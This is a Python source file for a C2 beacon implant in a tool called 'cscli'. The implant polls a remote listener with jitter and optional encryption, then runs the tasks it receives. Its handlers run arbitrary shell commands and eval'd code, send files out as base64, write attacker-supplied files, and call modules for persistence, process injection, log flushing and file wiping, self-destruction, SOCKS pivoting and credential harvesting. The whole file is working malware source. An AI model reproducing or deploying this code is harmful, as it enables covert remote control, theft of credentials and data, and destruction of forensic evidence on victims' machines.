"""Beacon client (Python implant).

Polls a cscli HTTPS/HTTP listener, receives tasking, executes commands,
returns base64-encoded results. Lightweight and self-contained using stdlib.
"""
import base64
import json
import os
import platform
import random
import ssl
import subprocess
import sys
import time
import urllib.request
import hashlib

from .. import commands as cmd


def ssl_create_unverified_context():
    """TLS context that skips peer certificate verification (for connecting to
    self-signed cscli HTTPS listeners)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class _Disconnect(Exception):
    """Raised by do_disconnect to cleanly stop the beacon's main loop."""


class Beacon:
    def __init__(self, server_url, interval=5, jitter=0.2, beacon_id=None,
                 no_verify=False, key=None):
        self.server_url = server_url.rstrip("/")
        self.interval = interval
        self.jitter = jitter
        self.pwd = os.getcwd()
        self.beacon_id = beacon_id
        self.no_verify = no_verify
        self.gcm = None
        if key is not None:
            from ..crypto import derive_key, GCMCipher
            self.gcm = GCMCipher(derive_key(key))
        self.meta = self._gather_meta()

    def _gather_meta(self):
        return {
            "hostname": platform.node(),
            "username": self._get_user(),
            "pid": os.getpid(),
            "arch": platform.machine(),
            "osinfo": f"{platform.system()} {platform.release()}",
            "internal_ip": self._get_internal_ip(),
            "python": platform.python_version(),
        }

    def _get_user(self):
        try:
            import getpass
            return getpass.getuser()
        except Exception:
            import os as _os
            return _os.environ.get("USER", _os.environ.get("USERNAME", "unknown"))

    def _get_internal_ip(self):
        try:
            s = __import__("socket").socket(__import__("socket").AF_INET, __import__("socket").SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ---------- Transport ----------
    def _opener(self):
        if not self.no_verify:
            return urllib.request.urlopen
        ctx = ssl_create_unverified_context()
        return lambda req, **kw: urllib.request.urlopen(req, context=ctx, **kw)

    def _post(self, path, payload):
        opener = self._opener()
        if self.gcm is not None:
            body = self.gcm.encrypt(json.dumps(payload).encode())
        else:
            body = json.dumps(payload).encode()
        req = urllib.request.Request(self.server_url + path, data=body,
                                     headers={"Content-Type": "application/octet-stream"
                                                     if self.gcm else "application/json"})
        with opener(req, timeout=30) as r:
            raw = r.read()
        if self.gcm is not None:
            raw = self.gcm.decrypt(raw)
        return json.loads(raw.decode())

    def _sleep_interval(self):
        rnd = 1 + (random.random() * self.jitter * 2)
        return self.interval * rnd

    # ---------- Execution ----------
    def handle_command(self, cmdline):
        """Execute one task. Returns (ok, result_text)."""
        name, args, err = cmd.validate_cmd(cmdline)
        if err:
            return False, f"task error: {err}"
        handler = getattr(self, f"do_{name}", None)
        if not handler:
            return False, f"no handler for {name}"
        try:
            return handler(args)
        except (_Disconnect, SystemExit):
            raise
        except Exception as e:
            return False, f"error executing {name}: {e}"

    # --- command handlers ---
    def do_help(self, args):
        lines = ["Beacon commands:"]
        for n, (desc, _, ex) in cmd.COMMANDS.items():
            lines.append(f"  {n:<10} {desc}\n      e.g. {ex}")
        return True, "\n".join(lines)

    def do_pwd(self, args):
        return True, self.pwd

    def do_cd(self, args):
        path = args.strip()
        if not path:
            return False, "usage: cd <dir>"
        os.chdir(path)
        self.pwd = os.getcwd()
        return True, self.pwd

    def do_shell(self, args):
        proc = subprocess.run(args, shell=True, capture_output=True, text=True,
                              timeout=60, cwd=self.pwd)
        out = proc.stdout or ""
        err = proc.stderr or ""
        rc = proc.returncode
        res = out
        if err:
            res += ("\n[stderr]\n" + err) if res else err
        res += f"\n[exit: {rc}]"
        return True, res

    def do_ls(self, args):
        path = args.strip() or self.pwd
        try:
            entries = os.listdir(path)
        except OSError as e:
            return False, f"ls error: {e}"
        rows = []
        for e in sorted(entries):
            full = os.path.join(path, e)
            try:
                st = os.stat(full)
                kind = "d" if os.path.isdir(full) else "f"
                rows.append(f"{kind} {st.st_size:>10} {e}")
            except OSError:
                rows.append(f"? {e}")
        return True, f"{path}:\n" + "\n".join(rows)

    def do_cat(self, args):
        path = args.strip()
        try:
            if os.path.isdir(path):
                return False, f"{path} is a directory"
            with open(path, "r", errors="replace") as f:
                data = f.read()
        except OSError as e:
            return False, f"cat error: {e}"
        return True, data[:200000]

    def do_download(self, args):
        path = args.strip()
        try:
            with open(path, "rb") as f:
                raw = f.read()
        except OSError as e:
            return False, f"download error: {e}"
        b64 = base64.b64encode(raw).decode()
        return True, f"FILE {path} SIZE {len(raw)} B64 {b64}"

    def do_upload(self, args):
        # format: <path>;<base64>
        if ";" not in args:
            return False, "upload format: upload <path>;<base64data>"
        path, b64 = args.split(";", 1)
        b64 = b64.strip()
        try:
            data = base64.b64decode(b64)
            with open(path, "wb") as f:
                f.write(data)
        except Exception as e:
            return False, f"upload error: {e}"
        return True, f"wrote {len(data)} bytes to {path}"

    def do_info(self, args):
        return True, json.dumps(self.meta, indent=2)

    def do_whoami(self, args):
        return True, str(self._get_user())

    def do_sysinfo(self, args):
        import platform as p
        return True, f"OS={p.platform()}\nRelease={p.release()}\nArch={p.machine()}\n" \
                     f"Python={p.python_version()}\nPID={os.getpid()}"

    def do_sleep(self, args):
        try:
            self.interval = max(1, int(args.strip()))
        except Exception:
            return False, "sleep requires seconds (int)"
        return True, f"interval set to {self.interval}s"

    def do_exit(self, args):
        raise SystemExit(0)  # handled

    def do_disconnect(self, args):
        """Server-ordered disconnect: send goodbye, then stop the beacon's loop
        and remove this session on the server side."""
        try:
            self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
                                    "results": [{"id": "disconnect", "data": "server_ordered_disconnect"}]})
        except Exception:
            pass
        try:
            self._post("/disconnect", {"beacon_id": self.beacon_id})
        except Exception:
            pass
        raise _Disconnect()

    def do_exec(self, args):
        code = args.strip()
        result = eval(code, {"__builtins__": __builtins__}, vars())
        return True, str(result)

    # ---------- operational module handlers ----------
    def _load_import(self, modname):
        """Import a capability module / crypto by name. Works in package mode
        (cs.modules.* / cs.crypto) and in the inlined standalone payload (where
        _load_import is patched to fetch injected namespaces)."""
        try:
            if modname == "crypto":
                return __import__("cs.crypto", fromlist=["cs"])
            return __import__(f"cs.modules.{modname}", fromlist=[modname])
        except Exception:
            # stand-alone fallback: injected modules on class
            attr = {"persistence": "_mod_persist", "injection": "_mod_inject",
                    "antiforensics": "_mod_af", "obfuscation": "_mod_obf",
                    "crypto": "_mod_crypto"}.get(modname)
            if attr:
                return getattr(self, attr, None)
        return None

    def do_persist(self, args):
        parts = args.split()
        if parts and parts[0] in ("list", "help"):
            return True, "mechanisms: " + ", ".join(
                ["registry", "runkey", "cron", "xdg-autostart", "shell-profile", "systemd"])
        if len(parts) < 2:
            return False, "persist <mechanism> <payload_path> [name]"
        mechanism, path = parts[0], parts[1]
        name = parts[2] if len(parts) > 2 else "cscli"
        mod = self._load_import("persistence")
        if mod is None:
            return False, "persistence module unavailable"
        ok, msg = mod.install(mechanism, path, name)
        return ok, msg

    def do_inject(self, args):
        parts = args.split()
        if len(parts) < 3:
            return False, "inject <tech> <pid> <payload_ref>"
        tech, pid, ref = parts[0], parts[1], " ".join(parts[2:])
        mod = self._load_import("injection")
        if mod is None:
            return False, "injection module unavailable"
        ok, msg = mod.inject(tech, pid, ref)
        return ok, msg

    def do_wipe(self, args):
        parts = args.split()
        if not parts:
            return False, "wipe <path> [rounds]"
        path = parts[0]
        rounds = int(parts[1]) if len(parts) > 1 else 1
        mod = self._load_import("antiforensics")
        if mod is None:
            return False, "antiforensics module unavailable"
        return mod.wipe_file(path, rounds)

    def do_flushlogs(self, args):
        mod = self._load_import("antiforensics")
        if mod is None:
            return False, "antiforensics module unavailable"
        report = mod.flush_system_logs()
        return True, "\n".join(f"  {a}: {b}" for a, b in report)

    def do_cleanmru(self, args):
        path = args.strip()
        if not path:
            return False, "cleanmru <path>"
        mod = self._load_import("antiforensics")
        if mod is None:
            return False, "antiforensics module unavailable"
        ok, msg = mod.clear_recent_files(path)
        return ok, msg

    def do_selfdestruct(self, args):
        mod = self._load_import("antiforensics")
        if mod is None:
            return False, "antiforensics module unavailable"
        path = args.strip() or None
        removed = mod.self_destruct(path)
        return True, "removed: " + (", ".join(removed) if removed else "nothing; file may be in use")

    # ---------- Main loop ----------
    def start(self):
        print(f"[*] cscli beacon {self.beacon_id} -> {self.server_url}")
        # Initial registration with retry: if the server isn't up yet, don't
        # exit -- enter the same reconnect loop so we keep trying until it is.
        while True:
            try:
                self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
                                        "results": []})
                break                               # registered OK
            except Exception as e:
                print(f"[!] initial checkin failed: {e}; retrying in {self.interval}s")
                time.sleep(self._sleep_interval())
        while True:
            try:
                self._tick()
            except _Disconnect:
                print("[*] disconnected by server.")
                break
            except SystemExit:
                print("[*] exit requested. sending goodbye.")
                try:
                    self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
                                            "results": [{"id": "bye", "data": "deliberately_exited"}]})
                except Exception:
                    pass
                break
            except KeyboardInterrupt:
                print("[!] interrupted.")
                break
            except Exception as e:
                print(f"[!] tick error: {e}; retrying in {self.interval}s")
            time.sleep(self._sleep_interval())

    def _tick(self):
        # First, post a checkin with no results and read pending tasks + socks_out.
        resp = self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
                                       "results": ""})
        self.interval = resp.get("interval", self.interval)
        socks_out = resp.get("socks_out")
        if socks_out:
            self._deliver_socks(socks_out)
        tasks = resp.get("tasks") or []
        results = []
        for t in tasks:
            tid = t.get("id")
            ok, data = self.handle_command(t.get("cmd", ""))
            results.append({"id": tid, "data": data})
        if results:
            self._post("/checkin", {"beacon_id": self.beacon_id, "meta": self.meta,
                                    "results": results})

    # ---- SOCKS5 pivot support ----
    def _deliver_socks(self, socks_out):
        """Write buffered server->client bytes to local SOCKS client sockets."""
        socks = getattr(self, "_socks_clients", None)
        if not socks:
            return
        import base64 as _b
        for item in socks_out:
            cid = item.get("conn_id")
            client_sock = socks.get(cid)
            if client_sock is None:
                continue
            data = item.get("data")
            if item.get("eof"):
                try:
                    client_sock.close()
                except Exception:
                    pass
                socks.pop(cid, None)
                continue
            if data:
                try:
                    client_sock.sendall(_b.b64decode(data))
                except Exception:
                    socks.pop(cid, None)

    def do_socks(self, args):
        """Start a SOCKS5 pivot server on the beacon: socks <port>"""
        try:
            port = int(args.strip())
        except Exception:
            return False, "socks <port>"
        mod = self._load_import("socks")
        if mod is None:
            return False, "socks module unavailable"
        srv = mod.SocksServer(self, port)
        srv.start()
        self._socks_server = srv
        self._socks_clients = {}
        return True, f"SOCKS5 pivot listening on 0.0.0.0:{port} -> relayed via C2"

    def do_socks_stop(self, args):
        srv = getattr(self, "_socks_server", None)
        if srv:
            srv.stop()
            self._socks_clients = {}
            return True, "SOCKS5 pivot stopped"
        return False, "no SOCKS5 pivot running"

    def do_creds(self, args):
        scope = (args.strip() or "all")
        mod = self._load_import("credentials")
        if mod is None:
            return False, "credentials module unavailable"
        ok, msg = mod.enumerate_credentials(scope)
        return ok, msg


def main():
    """CLI entry for running a beacon standalone."""
    import argparse
    ap = argparse.ArgumentParser(description="cscli beacon client")
    ap.add_argument("server", help="C2 server URL, e.g. http://1.2.3.4:8080")
    ap.add_argument("--interval", type=int, default=5)
    ap.add_argument("--jitter", type=float, default=0.2)
    ap.add_argument("--name", help="beacon id override", default=None)
    ap.add_argument("--key", help="AES passphrase for C2 channel encryption", default=None)
    ap.add_argument("--no-verify", action="store_true",
                    help="skip TLS cert verification (for self-signed listeners)")
    args = ap.parse_args()

    bid = args.name
    if not bid:
        bid = hashlib.sha1(f"{platform.node()}-{os.getpid()}-{time.time()}".encode()).hexdigest()[:16]
    b = Beacon(args.server, interval=args.interval, jitter=args.jitter, beacon_id=bid,
               no_verify=args.no_verify, key=args.key)
    b.start()


if __name__ == "__main__":
    main()
